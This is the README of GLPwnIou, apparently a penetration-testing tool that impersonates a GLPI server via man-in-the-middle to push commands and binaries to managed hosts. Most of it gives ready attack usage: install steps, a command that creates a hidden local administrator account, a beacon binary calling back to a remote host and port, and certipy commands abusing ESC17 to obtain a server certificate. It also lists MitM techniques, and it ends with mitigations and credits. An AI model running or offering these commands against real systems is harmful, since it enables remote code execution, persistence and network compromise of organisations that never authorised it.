# GLPwnIou

Rogue Man-in-The-Middle GLPI server used to obtain RCE on managed devices. This tool takes advantage of the [glpiinventory_deploy](https://help.glpi-project.org/tutorials/inventory/glpiinventory_deploy) feature, which enables a GLPI server to push updates (binaries and/or commands) to a managed Linux or windows host.

Prerequisites :

- [ ] A Man-In-the-Middle position. Examples of ways include :
  - using `MitM6` if IPv6 is enabled
  - editing a DNS entry in the domain
  - ARP spoofing (`bettercap`, `ettercap`) on a flat L2 segment.
- [ ] One of the following:
  - The agent **uses HTTP** to reach the server
  - The agent uses HTTP**S** to reach the server, but the **certificate SSL check is disabled**
  - The agent uses HTTP**S**, but **the attacker can get a Server Authentication certificate for the server** (usually through ESC17, alhough one could hypothetically be found in a public share)

## Install

> **Authorized use only.** GLPwnIou is intended for security research and
> penetration testing engagements you are explicitly authorized to perform.

The recommended way to install GLPwnIou is with [pipx](https://pipx.pypa.io),
which installs it into an isolated environment and exposes the `glpwniou`
command globally:

```bash
pipx install GLPwnIou
```

Or with `pip` (ideally inside a virtual environment):

```bash
pip install GLPwnIou
```

Once installed, run it via the `glpwniou` entry point:

### From source

```bash
git clone https://github.com/FenriskSecurity/glpwniou
cd GLPwnIou
pipx install .          # or: pip install .
```

GLPwnIou has no third-party dependencies and requires Python 3.8+.

## Usage examples

### Various payloads methods

Harmless default : Will only create a file in `C:\Windows\Temp` with the output of `whoami`

```bash
glpwniou --advertise https://glpi.acme.local/deploy ...
```

Command execution : Will run the specified powershell command

```bash
glpwniou --advertise https://glpi.acme.local/deploy ... \
  --cmd 'cmd.exe /c net user pwned P@ssw0rd! /add & net localgroup administrators pwned /add'
```

Run a binary on the target : Will execute the binary as is unless you provide the `run-command` parameter. You can optionally provide an executable name to be used when dropped on target (make sure to use this name when using custom commands)

```bash
# Execute the binary as is
glpwniou --advertise https://glpi.acme.local/deploy ... \
  --payload-file ./beacon.exe
# Execute the renammed binary
glpwniou --advertise https://glpi.acme.local/deploy ... \
  --payload-file ./beacon.exe --run-name updater.exe
# Execute the binary with a custom call
glpwniou --advertise https://glpi.acme.local/deploy ... \
  --payload-file ./beacon.exe \
  --run-command "./beacon.exe -ip 13.37.13.37 -port 9000"
```

> Note that `cmd` and `payload-file` are mutually exclusive. The `advertise` flag does not have to match exactly the `serverURL`, however it will be the path at wich the agent will request the binaries and the server will serve them, so sticking as close as possible to the configured value may help regarding monitoring of suspicious activity.

### Agents configured to only use HTTP

```bash
glpwniou --advertise https://glpi.acme.local/deploy --port 80
```

### Agents configured to use HTTPS without SSL checks

```bash
glpwniou --advertise https://glpi.acme.local/deploy --port 443 --tls
```

- This will generate a self-signed cert for `CN=glpi.acme.local`
- Make sure to use the right FQDN in the `advertise` URL else the agent will return a `Peer certificate not verified`

### Agents configure to properly use HTTPS, but you have found a valid certificate for the target server

This focuses on the ESC17 way, but you may find one in an SMB share or in another way

```bash
# look for ESC17-vulnerable teplates
certipy find -u "user@acme.local" -p "password" -dc-ip ... -stdout
certipy req -dc-ip ... -u "user@acme.local" -p "password" -target glpi.acme.local -ca '...' \
  -template ESC17 -dns glpi.acme.local -out glpi
openssl pkcs12 -in glpi.pfx -out glpi.pem -nodes -passin pass:
```

## Agent version support

- [x] Agent 1.7.x (latest version with auto-enabled deploy)
- [x] Agent 1.17.x
- [x] Agent 1.18.x
- [x] Agent 1.19.x (latest version)

## Screenshots

Coming Soon 😁

## Improvements

- More Agent versions support
- Support for multi-OS concurrent poisoning (send a payload/cmd to Windows and another payload/cmd to Linux)
- Integrated ARP spoofing support like [wsuks](https://github.com/NeffIsBack/wsuks) does

## Mitigations

- Setup your agents to use HTTPS and check the certificate rather than use HTTP or blindly trust any certificate.
- Regarding ESC17, please check out [the certipy wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc17-enrollee-supplied-subject-for-server-authentication) for mitigation recommendations. **This is no GLPI vulnerability, the issue lies in the trust chain (a misconfiguration in the ADCS)**
- Disable the `Deploy` task where it isn't needed
- Protect against/monitor MitM vectors (disable IPv6 if not used, alert on DNS changes/ARP flooding)

## Acknowledgements and previous works

- https://github.com/NeffIsBack/wsuks from [@al3x_n3ff](https://x.com/al3x_n3ff?lang=fr) for the inspiration
- https://labs.itresit.es/2026/02/25/glpi-agent-the-no-cve-that-still-bought-us-domain-compromise/ from [javier_at_labs](https://x.com/javier_at_labs) that happened to concurrently publish an article on the same topic as the one we were researching
- https://mustafanafizdurukan.github.io/posts/esc17-wsus-dns-abuse/ from [mustafandurukan](https://twitter.com/mustafandurukan) showcasing the DNS poisoning rather than classical Man in The Middle attack
- https://help.glpi-project.org/tutorials/inventory/secure_agent : The GLPI official documentation